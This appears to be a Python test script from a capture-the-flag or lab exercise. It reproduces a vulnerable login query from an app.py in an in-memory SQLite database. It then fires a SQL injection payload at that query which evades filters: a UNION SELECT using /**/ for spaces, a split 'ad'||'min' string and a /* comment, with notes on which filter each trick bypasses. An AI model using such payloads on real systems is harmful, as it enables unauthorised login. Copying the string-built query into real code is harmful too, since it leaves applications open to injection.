import sqlite3

def test_query(username, password):
    conn = sqlite3.connect(':memory:')
    c = conn.cursor()
    c.execute('CREATE TABLE users (username TEXT, password TEXT)')
    c.execute("INSERT INTO users VALUES ('admin', 'secret')")
    
    # Vulnerable query structure from app.py
    query = f"SELECT username, password FROM users WHERE username = '{username}' AND password = '{password}'"
    print(f"Query: {query}")
    
    try:
        c.execute(query)
        result = c.fetchone()
        if result:
            print(f"Success! Logged in as: {result}")
            return True
        else:
            print("Failed: No result")
            return False
    except Exception as e:
        print(f"Error: {e}")
        return False
    finally:
        conn.close()

# Target payload: 1234'/**/UNION/**/SELECT/**/'ad'||'min','fakehash'/*
# Bypasses: space -> /**/, admin -> 'ad'||'min', -- -> /*

print("--- Testing Harder Payload ---")
payload_user = "1234'/**/UNION/**/SELECT/**/'ad'||'min','fakehash'/*"
payload_pass = "anything"

test_query(payload_user, payload_pass)
